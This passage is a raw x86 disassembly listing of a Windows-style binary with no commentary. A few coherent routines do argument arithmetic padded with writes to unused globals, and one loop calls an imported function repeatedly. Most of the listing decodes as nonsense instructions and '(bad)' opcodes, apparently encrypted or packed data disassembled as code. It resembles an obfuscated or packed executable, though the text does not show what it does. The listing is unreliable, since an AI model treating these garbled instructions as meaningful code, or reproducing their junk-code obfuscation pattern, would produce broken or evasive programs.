  408256:	sbb    ch,BYTE PTR [edx+0x1f1c4353]
  40825c:	adc    al,0xc5
  40825e:	jb     0x40827d
  408260:	rcr    BYTE PTR [esi+0x25beabb9],cl
  408266:	sub    eax,0xc8e719b4
  40826b:	retf   
  40826c:	xchg   edx,eax
  40826d:	stos   DWORD PTR es:[edi],eax
  40826e:	dec    esi
  40826f:	bound  edi,QWORD PTR [ebx+0x6dd58339]
  408275:	aad    0xa4
  408277:	jno    0x408210
  408279:	mov    al,ds:0xc97aa60e
  40827e:	popf   
  40827f:	push   eax
  408280:	neg    BYTE PTR [esi+eiz*1]
  408283:	adc    ebp,DWORD PTR [ebx]
  408285:	repnz aam 0xc3
  408288:	and    esi,DWORD PTR [esi+0x94134bc]
  40828e:	cmp    cl,BYTE PTR [esi+0x53]
  408291:	dec    edi
  408292:	mov    al,ds:0x602eef8a
  408297:	pop    es
  408298:	sub    DWORD PTR [ebx],0xbce2f838
  40829e:	fwait
  40829f:	push   ebx
  4082a0:	cli    
  4082a1:	stos   BYTE PTR es:[edi],al
  4082a2:	leave  
  4082a3:	leave  
  4082a4:	jae    0x408309
  4082a6:	xchg   esi,eax
  4082a7:	jnp    0x40823f
  4082a9:	scas   eax,DWORD PTR es:[edi]
  4082aa:	call   0x167e:0xecab600e
  4082b1:	pop    ecx
  4082b2:	lea    edi,[esi+0x3d]
  4082b5:	ja     0x40829c
  4082b7:	jmp    0x40832c
  4082b9:	sub    al,0x6a
  4082bb:	mov    esi,0x52998471
  4082c0:	sbb    al,0x16
  4082c2:	dec    ecx
  4082c3:	mov    eax,0x73d96730
  4082c8:	mov    edx,0xad695d74
  4082cd:	in     al,0xf6
  4082cf:	mov    eax,0xca4ae2ac
  4082d4:	add    edi,DWORD PTR [eax]
  4082d6:	(bad)
  4082d9:	inc    esp
  4082da:	scas   eax,DWORD PTR es:[edi]
  4082db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082dc:	rol    BYTE PTR [ecx],cl
  4082de:	iret   
  4082df:	dec    ecx
  4082e0:	nop
  4082e1:	xchg   edx,eax
  4082e2:	in     al,0x5f
  4082e4:	and    BYTE PTR [ecx+ebx*2+0x61681466],0x71
  4082ec:	mov    cl,0x43
  4082ee:	fnstenv [ebx+0x79]
  4082f1:	add    esi,eax
  4082f3:	fdivr  DWORD PTR [edi]
  4082f5:	mov    al,0x26
  4082f7:	push   0x48e1fa23
  4082fc:	xchg   si,ax
  4082fe:	dec    ecx
  4082ff:	jne    0x40835c
  408301:	xor    al,0x12
  408303:	sub    eax,0xbb0887ca
  408308:	and    DWORD PTR [edi+0x599f4e59],esp
  40830e:	or     BYTE PTR [edx],0x25
  408311:	jg     0x4082ac
  408313:	cmp    dl,BYTE PTR [ebp+0x6380ed62]
  408319:	and    eax,0xc3fe96d
  40831e:	jge    0x4082d6
  408320:	or     eax,0xcdf6060a
  408325:	and    BYTE PTR [ebx],ah
  408327:	std    
  408328:	and    eax,0x8dc40c1e
  40832d:	test   BYTE PTR [eax],dl
  40832f:	popf   
  408330:	jb     0x408364
  408332:	add    BYTE PTR [ecx+0x45ff0845],cl
  408338:	or     al,0xe9
  40833a:	adc    al,0xfb
  40833c:	(bad)  
  40833d:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e8f2
  408366:	adc    DWORD PTR ds:0x42e8e2,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x4306c2,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e8ee,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e8ee
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x430626,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43060a
  4083aa:	or     DWORD PTR ds:0x42ef8c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ef90,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43060e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e8e6,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43061a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e8f6,0x42e8ee
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e8ee,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43060e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43060e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43060e,esi
  408424:	cmp    DWORD PTR ds:0x43060e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42eb88
  40844d:	cmp    DWORD PTR ds:0x43060e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40847e:	jbe    0x40840d
  408480:	adc    esp,DWORD PTR [ecx-0x24]
  408483:	jle    0x408503
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x408420
  40848a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40848b:	out    dx,al
  40848c:	xor    al,0x33
  40848e:	es lahf 
  408490:	sti    
  408491:	adc    ah,BYTE PTR [esi-0x42]
  408494:	shl    DWORD PTR [ebx-0x69],1
  408497:	pop    edi
  408498:	jns    0x4084d6
  40849a:	iret   
  40849b:	add    edi,edx
  40849d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40849e:	mov    ecx,0xf2c322c
  4084a3:	out    dx,eax
  4084a4:	xor    BYTE PTR [eax-0x8],0x27
  4084a8:	inc    ebx
  4084a9:	mov    ch,0x88
  4084ab:	sbb    edx,0xffffffb2
  4084ae:	and    BYTE PTR [edi],ah
  4084b0:	or     dl,cl
  4084b2:	in     al,dx
  4084b3:	fcomp  DWORD PTR [eax+0x2d]
  4084b6:	(bad)  
  4084b7:	push   ecx
  4084b8:	adc    al,0x35
  4084ba:	and    eax,0x40f9b116
  4084bf:	fs nop
  4084c1:	jnp    0x40853a
  4084c3:	jmp    0x408485
  4084c5:	cmp    cl,BYTE PTR [edx*8+0x47e1ff21]
  4084cc:	xchg   DWORD PTR [ebp-0x5309f688],esp
  4084d2:	mov    ecx,eax
  4084d4:	xchg   ecx,eax
  4084d5:	dec    edi
  4084d6:	sbb    ah,0x2a
  4084d9:	sbb    eax,0xe941a60
  4084de:	jno    0x40851a
  4084e0:	aaa    
  4084e1:	mov    al,ds:0xfb1dd7d5
  4084e6:	xor    esp,DWORD PTR [eax-0x77]
  4084e9:	inc    eax
  4084ea:	push   0xe8939cc5
  4084ef:	in     al,0x20
  4084f1:	mov    ch,0xe8
  4084f3:	xchg   ebp,eax
  4084f4:	dec    esp
  4084f5:	mov    ss,edi
  4084f7:	mov    dh,0xcb
  4084f9:	inc    edx
  4084fa:	mov    bh,0xa0
  4084fc:	test   al,0x91
  4084fe:	jnp    0x40857f
  408500:	or     BYTE PTR [eax],bl
  408502:	push   ecx
  408503:	jecxz  0x40856b
  408505:	sbb    ch,al
  408507:	jl     0x408510
  408509:	sahf   
  40850a:	sub    esi,DWORD PTR [ebx-0x4df32519]
  408510:	scas   eax,DWORD PTR es:[edi]
  408511:	fcmovnbe st,st(3)
  408513:	cli    
  408514:	inc    edi
  408515:	xor    DWORD PTR [ebx-0x55e8d386],0x22
  40851c:	and    esp,eax
  40851e:	(bad)  
  408520:	push   cs
  408521:	call   0x2e49:0xcf8b9a49
  408528:	mov    dh,bl
  40852a:	pusha  
  40852b:	cmp    bl,BYTE PTR [ebp+0x6c]
  40852e:	cld    
  40852f:	in     eax,0x63
  408531:	push   esi
  408532:	out    0xa1,al
  408534:	retf   0x3ce7
  408537:	and    ch,BYTE PTR ds:0xfad7df00
  40853d:	push   0x30ed549a
  408542:	adc    al,0x78
  408544:	div    BYTE PTR [edi-0x6b95a9d7]
  40854a:	or     eax,0xae9c6c8b
  40854f:	adc    DWORD PTR [ecx-0x3c],edx
  408552:	and    BYTE PTR [ebp+0x50],cl
  408555:	push   edi
  408556:	lods   eax,DWORD PTR ds:[esi]
  408557:	pop    ebp
  408558:	test   eax,0xe9a2ec57
  40855d:	push   edx
  40855e:	loope  0x4085d3
  408560:	jo     0x408599
  408562:	stos   BYTE PTR es:[edi],al
  408563:	and    al,0x73
  408565:	repnz les ecx,FWORD PTR [ecx+0x61]
  408569:	and    al,0x15
  40856b:	adc    BYTE PTR [edx+0x1c3e182c],0xc9
  408572:	mov    eax,ds:0x5f48fafd
  408577:	or     BYTE PTR [edi-0x1a],0x93
  40857b:	mov    edx,0xaf5cf816
  408580:	jnp    0x4085a3
  408582:	(bad)  
  408583:	pop    edx
  408584:	pop    ds
  408585:	daa    
  408586:	mov    ds:0x4988ba93,eax
  40858b:	outs   dx,DWORD PTR ds:[esi]
  40858c:	dec    ebx
  40858d:	gs (bad) 
  40858f:	sar    BYTE PTR [eax-0x2],cl
  408592:	sbb    BYTE PTR [ebx],cl
  408594:	mov    esp,0x1a66c89b
  408599:	cmp    eax,0x5c7cb030
  40859e:	in     al,0x75
  4085a0:	aam    0xb1
  4085a2:	sub    BYTE PTR [ecx],ah
  4085a4:	inc    eax
  4085a5:	and    eax,0x15cba108
  4085aa:	mov    WORD PTR [bp+di+0x1],fs
  4085ae:	call   0xc4ee:0x589854ed
  4085b5:	add    eax,edi
  4085b7:	test   eax,0x13199739
  4085bc:	or     dh,BYTE PTR [edx-0x4c]
  4085bf:	out    0xcf,al
  4085c1:	or     eax,0x8aed980b
  4085c6:	pop    esi
  4085c7:	rcr    DWORD PTR [edx+0x50a29a8],1
  4085cd:	ins    DWORD PTR es:[edi],dx
  4085ce:	leave  
  4085cf:	call   0xa93ce4f2
  4085d4:	mov    ecx,DWORD PTR [edi+0x0]
  4085d7:	mov    dl,0x5c
  4085d9:	loopne 0x40857f
  4085db:	les    edi,FWORD PTR [edi-0x20]
  4085de:	sahf   
  4085df:	mov    edx,0x3e416a37
  4085e4:	outs   dx,BYTE PTR ds:[esi]
  4085e5:	aas    
  4085e6:	jbe    0x4085c6
  4085e8:	adc    ah,0x70
  4085eb:	pop    es
  4085ec:	sbb    DWORD PTR [eax],ebp
  4085ee:	int    0xcb
  4085f0:	sub    eax,0x53d9211f
  4085f5:	and    bl,BYTE PTR [eax-0x7b]
  4085f8:	aad    0xc2
  4085fa:	sub    al,0x1d
  4085fc:	rcr    BYTE PTR [esi+0x1f960f0f],cl
  408602:	adc    edi,DWORD PTR [esi-0x46af0ffd]
  408608:	cld    
  408609:	xor    DWORD PTR [ebx],0x9bc715c3
  40860f:	(bad)  
  408611:	adc    esi,ebx
  408613:	or     ecx,DWORD PTR [edi]
  408615:	inc    DWORD PTR [edi]
  408617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408618:	pop    ss
  408619:	push   es
  40861a:	lds    edi,FWORD PTR [eax]
  40861c:	jmp    0xb88a7923
  408621:	push   cs
  408622:	push   ebx
  408623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408624:	das    
  408625:	cli    
  408626:	mov    dl,0x16
  408628:	data16 loop 0x4085d7
  40862b:	sbb    eax,esi
  40862d:	dec    esi
  40862e:	les    ebp,FWORD PTR [ecx-0x652a652a]
  408634:	inc    edi
  408635:	outs   dx,BYTE PTR ds:[esi]
  408636:	das    
  408637:	lds    edi,FWORD PTR [ebx-0x3f]
  40863a:	xchg   edx,eax
  40863b:	sub    ebp,DWORD PTR [ebx+0x47]
  40863e:	jge    0x40868a
  408640:	test   BYTE PTR [ecx+eax*1],dl
  408643:	dec    edx
  408644:	pop    eax
  408645:	pop    es
  408646:	dec    ebx
  408647:	mov    al,0x1f
  408649:	dec    ebp
  40864a:	(bad)  
  40864b:	out    dx,eax
  40864c:	mov    cl,0x6
  40864e:	jl     0x4085f9
  408650:	xchg   BYTE PTR [eax+0x5],dl
  408653:	mov    edi,0x2859cde9
  408658:	ins    DWORD PTR es:[edi],dx
  408659:	or     ebp,DWORD PTR [eax+0x5f46a14a]
  40865f:	out    dx,eax
  408660:	mov    esp,DWORD PTR ds:0xe3f83015
  408666:	mov    edi,0xc3530d9
  40866b:	sbb    BYTE PTR [eax],dh
  40866d:	sub    al,0xc5
  40866f:	(bad)  
  408670:	sar    DWORD PTR [ebx-0x6f],1
  408673:	xchg   esp,eax
  408674:	xchg   DWORD PTR [ebx-0x285c533b],ebp
  40867a:	sub    dh,ch
  40867c:	in     al,0x10
  40867e:	in     eax,0x4e
  408680:	push   es
  408681:	xchg   DWORD PTR [edx],esp
  408683:	jl     0x408678
  408685:	inc    esi
  408686:	jns    0x4086ac
  408688:	ret    0xb9d8
  40868b:	mov    edi,0x516d3720
  408690:	test   eax,0xf0625cae
  408695:	sbb    bl,0xe9
  408698:	(bad)  
  408699:	inc    edx
  40869a:	mov    ecx,0x45f930bf
  40869f:	cmp    ch,cl
  4086a1:	dec    eax
  4086a2:	pop    edx
  4086a3:	aaa    
  4086a4:	mov    ecx,0xf97e7afa
  4086a9:	mov    ecx,0x7d6eee15
  4086ae:	jnp    0x4086d7
  4086b0:	sbb    al,0xd5
  4086b2:	(bad)  
  4086b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b4:	iret   
  4086b5:	lods   eax,DWORD PTR ds:[esi]
  4086b6:	jns    0x4086d0
  4086b8:	repnz mov ah,0xe
  4086bb:	add    esp,ebp
  4086bd:	call   0xc42d:0x7929c720
  4086c4:	pop    esi
  4086c5:	call   0x319978ac
  4086ca:	sub    al,0xb4
  4086cc:	or     dh,al
  4086ce:	and    eax,0x43d82e50
  4086d3:	mov    ds:0xb1ec63,eax
  4086d8:	imul   edx,DWORD PTR [ecx+0x6f186316],0x8159ff52
  4086e2:	adc    dl,BYTE PTR [eax]
  4086e4:	and    bl,BYTE PTR [esi-0x27]
  4086e7:	and    DWORD PTR [ebp-0xd58e0a1],ecx
  4086ed:	add    esp,DWORD PTR [edi]
  4086ef:	xor    BYTE PTR [edx+0x28],bl
  4086f2:	sbb    eax,0xc7ad45e9
  4086f7:	gs jle 0x408693
  4086fa:	mov    ecx,0x131bdf10
  4086ff:	out    0x48,eax
  408701:	mov    ch,0x41
  408703:	mov    ?,WORD PTR [ebx-0x2c]
  408706:	loopne 0x4086b8
  408708:	cmp    DWORD PTR [ecx+ecx*2],ebx
  40870b:	fs push 0x29b7e377
  408711:	jge    0x408774
  408713:	sti    
  408714:	repnz call FWORD PTR [eax+0x79]
  408718:	jne    0x408720
  40871a:	jne    0x4086de
  40871c:	adc    al,0xf3
  40871e:	fld    DWORD PTR [esi]
  408720:	mov    fs,ebx
  408722:	and    DWORD PTR [ebx+0xc],ecx
  408725:	inc    ebp
  408726:	xchg   edx,eax
  408727:	xchg   edx,eax
  408728:	cs jg  0x408767
  40872b:	push   ebx
  40872c:	clc    
  40872d:	dec    edx
  40872e:	jg     0x4086da
  408730:	out    0x13,eax
  408732:	mov    dl,0xe
  408734:	aaa    
  408735:	lea    eax,[esi+0x7ab3e702]
  40873b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40873d:	mov    BYTE PTR [ebp-0x1a],ah
  408740:	pop    ds
  408741:	xchg   ecx,eax
  408742:	iret   
  408743:	call   0x2809cb55
  408748:	fwait
  408749:	loop   0x408779
  40874b:	addr16 ret 
  40874d:	add    DWORD PTR ds:0xf4589cff,ecx
  408753:	inc    edi
  408754:	jbe    0x408771
  408756:	dec    esi
  408757:	daa    
  408758:	mov    cl,0x94
  40875a:	dec    edx
  40875b:	push   esi
  40875c:	dec    ah
  40875e:	shl    BYTE PTR [edx+0x2c59045b],cl
  408764:	xor    al,0x8f
  408766:	lods   al,BYTE PTR ds:[esi]
  408767:	aad    0xa7
  408769:	inc    eax
  40876a:	fnstenv [ebx]
  40876c:	sar    BYTE PTR [ecx+0x7264fcad],cl
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	(bad)  
  40878a:	fidivr WORD PTR [eax-0x80]
  40878d:	xchg   esp,eax
  40878e:	inc    ebx
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x40873b
  408797:	imul   ecx,DWORD PTR [edx+ebx*2],0xffffff83
  40879b:	jnp    0x408730
  40879d:	cwde   
  40879e:	inc    edx
  40879f:	xor    DWORD PTR [ecx+0x77a809c1],0x65
  4087a6:	and    dh,cl
  4087a8:	cmp    DWORD PTR [ebx-0x79a81ae0],ebp
  4087ae:	mov    esp,0xf9fb3982
  4087b3:	or     eax,DWORD PTR [edi]
  4087b5:	jmp    0x408743
  4087b7:	sub    al,0x37
  4087b9:	(bad)  
  4087ba:	adc    BYTE PTR [esi],dh
  4087bc:	cmp    eax,0x88f3a699
  4087c1:	add    bl,cl
  4087c3:	sub    eax,0x1819b135
  4087c8:	jp     0x40876b
  4087ca:	push   edx
  4087cb:	xor    bh,ah
  4087cd:	add    DWORD PTR [esi+0x6e],0xffffffa9
  4087d1:	mov    eax,0xd70ab23a
  4087d6:	popf   
  4087d7:	mov    ds:0xb59a36d6,al
  4087dc:	out    0x3d,al
  4087de:	push   es
  4087df:	inc    edx
  4087e0:	lock repnz mov BYTE PTR ds:[edx],cl
  4087e5:	cmp    al,0x65
  4087e7:	push   ecx
  4087e8:	xor    edi,edx
  4087ea:	and    BYTE PTR [ebx+eax*8-0x4efac8cb],cl
  4087f1:	sub    al,0xfa
  4087f3:	mov    ebx,0xe2f85540
  4087f8:	and    ah,bh
  4087fa:	clc    
  4087fb:	mov    eax,0x3ee8b57d
  408800:	xchg   ecx,eax
  408801:	add    BYTE PTR [ebx-0x59],ah
  408804:	or     eax,0x8ee21360
  408809:	loop   0x4087b0
  40880b:	ret    0xc418
  40880e:	jp     0x408863
  408810:	int    0x6d
  408812:	mov    ecx,0x9d817436
  408817:	fwait
  408818:	and    ah,ch
  40881a:	xchg   esp,eax
  40881b:	add    DWORD PTR [eax-0x14],eax
  40881e:	test   al,0xa8
  408820:	scas   al,BYTE PTR es:[edi]
  408821:	cmp    BYTE PTR [edi],cl
  408823:	xor    BYTE PTR [ebp-0x4edd2d1e],0x3
  40882a:	pushf  
  40882b:	jmp    0x2992:0x77f86b3
  408832:	pop    ebp
  408833:	scas   al,BYTE PTR es:[edi]
  408834:	les    ecx,FWORD PTR [ecx+0x4bcd4e0e]
  40883a:	jge    0x408804
  40883c:	push   ds
  40883d:	enter  0xe99d,0x70
  408841:	xor    edi,DWORD PTR [ecx]
  408843:	dec    ebp
  408844:	lods   al,BYTE PTR ds:[esi]
  408845:	or     al,0xe
  408847:	cmc    
  408848:	fistp  WORD PTR [ecx+0x5c]
  40884b:	sahf   
  40884c:	inc    ebp
  40884d:	mov    eax,0x844a4be0
  408852:	inc    ecx
  408853:	pusha  
  408854:	fst    QWORD PTR [edx]
  408856:	adc    DWORD PTR [ecx],edx
  408858:	mov    eax,0x437f0766
  40885d:	mov    WORD PTR [eax-0x387a1d76],cs
  408863:	adc    ebp,DWORD PTR [ebx-0x2ebbb284]
  408869:	jg     0x40883a
  40886b:	xor    ecx,DWORD PTR [ecx+0x20bf0309]
  408871:	mov    ah,0xca
  408873:	push   edi
  408874:	leave  
  408875:	ss push eax
  408877:	inc    ecx
  408878:	pop    edx
  408879:	jmp    0xee9a:0x573368fc
  408880:	mov    BYTE PTR [ebx-0x668717a8],ch
  408886:	xlat   BYTE PTR ds:[ebx]
  408887:	mov    ecx,DWORD PTR ds:0xad0ded5
  40888d:	retf   
  40888e:	adc    DWORD PTR [ecx],ebx
  408890:	mul    WORD PTR ds:0x1b7cea70
  408897:	loopne 0x40888a
  408899:	add    dl,BYTE PTR ds:0x83d11cc5
  40889f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088a0:	jo     0x408853
  4088a2:	dec    edi
  4088a3:	jo     0x40891d
  4088a5:	mov    ebp,0xedea94f4
  4088aa:	and    bl,BYTE PTR [ebp+0x2]
  4088ad:	pop    ebp
  4088ae:	lods   eax,DWORD PTR ds:[esi]
  4088af:	enter  0xcaf4,0x63
  4088b3:	ja     0x408842
  4088b5:	push   edi
  4088b6:	or     DWORD PTR [ecx+eiz*8],0xe6390196
  4088bd:	xchg   edx,eax
  4088be:	jmp    0x4088fb
  4088c0:	and    esi,DWORD PTR [ebx+0x475dca45]
  4088c6:	pop    es
  4088c7:	xor    al,0x61
  4088c9:	cmp    dh,ah
  4088cb:	outs   dx,BYTE PTR ds:[esi]
  4088cc:	sbb    BYTE PTR [edi],0x2
  4088cf:	test   BYTE PTR [ebx+0x792b418],ah
  4088d5:	fisubr WORD PTR [ecx+ebp*4-0x79]
  4088d9:	mov    eax,ds:0x690f3591
  4088de:	repz jae 0x40890d
  4088e1:	mov    WORD PTR [edi],ds
  4088e3:	inc    ebx
  4088e4:	lock stos DWORD PTR es:[edi],eax
  4088e6:	pop    edi
  4088e7:	mov    esp,edi
  4088e9:	or     al,0x80
  4088eb:	arpl   WORD PTR [eax],si
  4088ed:	dec    esp
  4088ee:	(bad)  
  4088ef:	mov    ebp,0x19e97f57
  4088f4:	push   ebx
  4088f5:	jno    0x40888d
  4088f7:	jmp    0x408961
  4088f9:	adc    ecx,DWORD PTR [esi-0x7569b89]
  4088ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408900:	data16 std 
  408902:	(bad)  
  408903:	adc    edx,ebx
  408905:	repz or esp,ecx
  408908:	cvtdq2ps xmm4,XMMWORD PTR [ebx]
  40890b:	mov    ch,BYTE PTR [ebp-0x1b03a026]
  408911:	cmp    al,ah
  408913:	shr    BYTE PTR [edi+eiz*2+0xa],0x87
  408918:	jl     0x4088d7
  40891a:	jns    0x4088a3
  40891c:	inc    ebx
  40891d:	enter  0xbb7d,0x3a
  408921:	push   esp
  408922:	and    al,0xb2
  408924:	cmc    
  408925:	(bad)  
  408926:	retf   
  408927:	pop    esp
  408928:	sub    edi,0xffffffa0
  40892b:	retf   
  40892c:	daa    
  40892d:	not    esp
  40892f:	(bad)
  408934:	pop    ebx
  408935:	inc    ebx
  408936:	pop    eax
  408937:	inc    edx
  408938:	jne    0x4088c9
  40893a:	aad    0xf2
  40893c:	pop    esp
  40893d:	pop    ecx
  40893e:	mov    esi,0xe855da24
  408943:	leave  
  408944:	ret    0xe4ed
  408947:	jns    0x408948
  408949:	mov    bl,0xbd
  40894b:	add    dl,bh
  40894d:	in     al,dx
  40894e:	push   edx
  40894f:	push   ebp
  408950:	jge    0x4088d3
  408952:	out    dx,eax
  408953:	sahf   
  408954:	das    
  408955:	inc    eax
  408956:	test   eax,0x7f16f89e
  40895b:	and    cl,BYTE PTR [ebp-0x32c8239a]
  408961:	aad    0x19
  408963:	mov    eax,0x7277da36
  408968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408969:	inc    esi
  40896a:	xchg   DWORD PTR [edx],ebp
  40896c:	into   
  40896d:	outs   dx,DWORD PTR ds:[esi]
  40896e:	mov    ebx,0xec59eb20
  408973:	mov    eax,0x1a34ae15
  408978:	js     0x408969
  40897a:	ins    BYTE PTR es:[edi],dx
  40897b:	popa   
  40897c:	mov    al,ds:0x8169e55c
  408981:	mov    edi,0x91c92f7d
  408986:	jmp    ecx
  408988:	push   edx
  408989:	int    0x5d
  40898b:	mov    al,ds:0xe8417412
  408990:	fs aaa 
  408992:	push   cs
  408993:	push   ss
  408994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408995:	call   0xf93c:0x7ee75d32
  40899c:	push   ebp
  40899d:	mov    bh,0xa
  40899f:	jl     0x40894a
  4089a1:	sbb    al,0xb4
  4089a3:	dec    ebx
  4089a4:	pop    dx
  4089a6:	dec    eax
  4089a7:	repz xor ah,BYTE PTR [ebp-0x36]
  4089ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089ac:	mov    esp,0xfaf8af05
  4089b1:	icebp  
  4089b2:	inc    ecx
  4089b3:	sbb    cl,BYTE PTR [ebx+ebp*2+0x34]
  4089b7:	cmp    DWORD PTR [ebp-0x4f],esi
  4089ba:	dec    ecx
  4089bb:	xchg   BYTE PTR [esp+ebp*8-0x4a],dl
  4089bf:	out    dx,eax
  4089c0:	xchg   edi,eax
  4089c1:	or     bh,dl
  4089c3:	js     0x408996
  4089c5:	add    bh,ah
  4089c7:	xchg   ebp,eax
  4089c8:	(bad)  
  4089c9:	dec    ebp
  4089ca:	jge    0x40895a
  4089cc:	jl     0x408a0a
  4089ce:	dec    ebx
  4089cf:	dec    ebp
  4089d0:	inc    edx
  4089d1:	fnstenv [ebx-0x14]
  4089d4:	sub    eax,0xa1d1706
  4089d9:	popf   
  4089da:	pop    ss
  4089db:	cld    
  4089dc:	dec    ebx
  4089dd:	inc    edi
  4089de:	shl    BYTE PTR [edi],cl
  4089e0:	sbb    eax,0x51aa5bfb
  4089e5:	mov    WORD PTR [eax],ss
  4089e7:	iret   
  4089e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089e9:	cmc    
  4089ea:	cmp    eax,0xede32826
  4089ef:	cli    
  4089f0:	ret    0x9817
  4089f3:	jle    0x408a48
  4089f5:	mov    ebp,0xd187b28
  4089fa:	mov    edx,DWORD PTR [esi-0x33ee4cad]
  408a00:	sub    BYTE PTR [ecx],bl
  408a02:	lods   eax,DWORD PTR ds:[esi]
  408a03:	adc    eax,0xbfb7623
  408a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a09:	inc    ecx
  408a0a:	cmp    DWORD PTR [bp+di+0x61a0],esi
  408a0f:	pop    ebx
  408a10:	and    eax,0xa98b1699
  408a15:	and    DWORD PTR [edx],edx
  408a17:	jo     0x4089e1
  408a19:	dec    eax
  408a1a:	hlt    
  408a1b:	fisttp QWORD PTR [eax+ebp*4]
  408a1e:	call   0xe5d8:0x66bfdf31
  408a25:	sbb    BYTE PTR [esi+0x47],dl
  408a28:	xchg   esp,eax
  408a29:	mov    bl,0x8e
  408a2b:	sub    al,0x7e
  408a2d:	ds push ebx
  408a2f:	data16 shr BYTE PTR [ebp+0x4e],1
  408a33:	cmp    al,0xa2
  408a35:	iret   
  408a36:	test   BYTE PTR [eax+0x6],0xd4
  408a3a:	rcr    BYTE PTR [ecx-0x1a2d7177],cl
  408a40:	dec    edx
  408a41:	repz into 
  408a43:	scas   al,BYTE PTR es:[edi]
  408a44:	lods   al,BYTE PTR ds:[esi]
  408a45:	in     al,0xcc
  408a47:	aad    0x4c
  408a49:	and    ah,BYTE PTR [edi-0x21]
  408a4c:	(bad)  
  408a4d:	fdiv   QWORD PTR ds:0xe6e2a195
  408a53:	fild   WORD PTR [ebx]
  408a55:	mov    edx,0x37ccafa1
  408a5a:	jmp    0x408a0e
  408a5c:	in     eax,dx
  408a5d:	mov    WORD PTR [eax-0x56],ds
  408a60:	lods   eax,DWORD PTR gs:[esi]
  408a62:	clc    
  408a63:	leave  
  408a64:	lds    ebx,FWORD PTR [ecx+0x2209b1c8]
  408a6a:	xchg   cx,ax
  408a6c:	pop    eax
  408a6d:	add    al,0x62
  408a6f:	fwait
  408a70:	jo     0x408a0b
  408a72:	xorps  xmm4,XMMWORD PTR [ecx-0x7eaaae4d]
  408a79:	leave  
  408a7a:	(bad)  
  408a7b:	sbb    eax,0xc18b8116
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e8ea,0x1d
